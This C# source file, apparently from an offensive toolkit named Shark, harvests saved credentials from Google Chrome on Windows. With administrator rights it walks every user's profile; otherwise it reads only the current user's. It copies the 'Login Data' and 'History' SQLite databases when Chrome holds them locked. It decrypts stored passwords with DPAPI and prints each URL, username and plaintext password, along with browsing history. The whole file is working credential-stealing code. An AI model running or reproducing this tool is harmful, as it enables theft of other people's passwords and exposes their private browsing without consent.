using System;
using System.Data;
using System.Collections;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using System.IO;
using CS_SQLite3;
using Shark.lib;
namespace Shark
{
    public class Chrome
    {
 
        public static void GetLogins()
        {
            Process[] chromeProcesses = Process.GetProcessesByName("chrome");
            ArrayList allPath = GetPath();
            Common.showMessage("[*]", "Try to get Chrome Credential");
            foreach (Dictionary<string, string> ChromePaths in allPath)
            {
                ChromePaths.TryGetValue("ChromeLoginDataPath", out string ChromeLoginDataPath);
                ChromePaths.TryGetValue("userDir", out string userDir);
                string userName = GetUserName(userDir);
                if (File.Exists(ChromeLoginDataPath))
                {
                    Common.showMessage("[*]", string.Format("Try to get {0} Chrome Credential", userName));
                    if (chromeProcesses.Length > 0)
                    {
                        ChromeLoginDataPath = CreateTempFile(ChromeLoginDataPath);
                        ParseChromeLogins(ChromeLoginDataPath, userName);
                        File.Delete(ChromeLoginDataPath);
                    }
                    else
                    {
                        ParseChromeLogins(ChromeLoginDataPath, userName);
                    }
                    Common.showMessage("[*]", string.Format("Get {0} Chrome Credential end", userName));

                }
            }
            Common.showMessage("[*]", "Try to get Chrome Credential end");
        }
        public static void GetHistroy(int num)
        {
            Process[] chromeProcesses = Process.GetProcessesByName("chrome");
            ArrayList allPath = GetPath();
            Common.showMessage("[*]", string.Format("Try to get Chrome Histroy count:{0}", num.ToString()));
            foreach (Dictionary<string, string> ChromePaths in allPath)
            {
                ChromePaths.TryGetValue("ChromeHistoryPath", out string ChromeHistoryPath);
                ChromePaths.TryGetValue("userDir", out string userDir);
                string userName = GetUserName(userDir);
                if (File.Exists(ChromeHistoryPath))
                {
                    Common.showMessage("[*]", string.Format("Try to get {0} Chrome Histroy count:{1}", userName, num.ToString()));
                    if (chromeProcesses.Length > 0)
                    {
                        ChromeHistoryPath = CreateTempFile(ChromeHistoryPath);
                        ParseChromeHistory(ChromeHistoryPath, num, userName);
                        File.Delete(ChromeHistoryPath);
                    }
                    else
                    {
                        ParseChromeHistory(ChromeHistoryPath, num, userName);
                    }
                    Common.showMessage("[*]", string.Format("Get {0} Chrome Histroy end", userName));

                }
            }
            Common.showMessage("[*]", string.Format("Try to get Chrome Histroy count:{0} end", num.ToString()));


        }
        private static ArrayList GetPath()
        {
            ArrayList userPaths = new ArrayList();
            ArrayList allPath = new ArrayList();
            string homeDrive = System.Environment.GetEnvironmentVariable("HOMEDRIVE");
            string homePath = System.Environment.GetEnvironmentVariable("HOMEPATH");
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");

            if (IsHighIntegrity())
            {
                string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                string[] dirs = Directory.GetDirectories(userFolder);
                foreach (string dir in dirs)
                {
                    userPaths.Add(dir);
                }
            }
            else
            {
                userPaths.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
            }
            foreach (string path in userPaths)
            {
                string userChromeBasePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\", path);
                if (Directory.Exists(userChromeBasePath))
                {
                    Dictionary<string, string> ChromePath = new Dictionary<string, string>()
                    {
                         {"ChromeHistoryPath",String.Format("{0}\\{1}", userChromeBasePath,"History")},
                         {"ChromeBookmarkPath",String.Format("{0}\\{1}", userChromeBasePath, "Bookmarks") },
                         {"ChromeLoginDataPath",String.Format("{0}\\{1}", userChromeBasePath, "Login Data") },
                         {"ChromeCookiesPath",String.Format("{0}\\{1}", userChromeBasePath, "Cookies") },
                         {"userDir", path}
                    };
                    allPath.Add(ChromePath);
                }
            }
            return allPath;
        }
        
       

        private static string CreateTempFile(string filePath)
        {
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");
            string newFile = "";
            newFile = Path.GetRandomFileName();
            string tempFileName = localAppData + "\\Temp\\" + newFile;
            File.Copy(filePath, tempFileName);
            return tempFileName;
        }
        private static string GetUserName(string userDir)
        {
            string userName = "";
            if (IsHighIntegrity())
            {
                string[] parts = userDir.Split('\\');
                userName = parts[parts.Length - 1];
            }
            else
            {
                userName = System.Environment.GetEnvironmentVariable("USERNAME");
            }
            return userName;
        }

        private static void ParseChromeHistory(string historyFilePath, int num, string user)
        {
            SQLiteDatabase database = new SQLiteDatabase(historyFilePath);
            string query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count limit  " + num.ToString() + ";";
            DataTable resultantQuery = database.ExecuteQuery(query);
            database.CloseDatabase();
            foreach (DataRow row in resultantQuery.Rows)
            {
                Common.showMessage("[+]", string.Format("Title:{0} url:{1} ", row["title"], row["url"]));
            }
        }

        private static void ParseChromeLogins(string loginDataFilePath, string user)
        {

            SQLiteDatabase database = new SQLiteDatabase(loginDataFilePath);
            string query = "SELECT action_url, username_value, password_value FROM logins";
            DataTable resultantQuery = database.ExecuteQuery(query);

            foreach (DataRow row in resultantQuery.Rows)
            {
                byte[] passwordBytes = Convert.FromBase64String((string)row["password_value"]);
                byte[] decBytes = ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser);
                string password = Encoding.ASCII.GetString(decBytes);
                if (password != String.Empty)
                {
                    Common.showMessage("[+]", String.Format("URL:{0} Username:{1} Password:{2}", row["action_url"], row["username_value"], password));
                }
            }
            database.CloseDatabase();
        }

        private static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
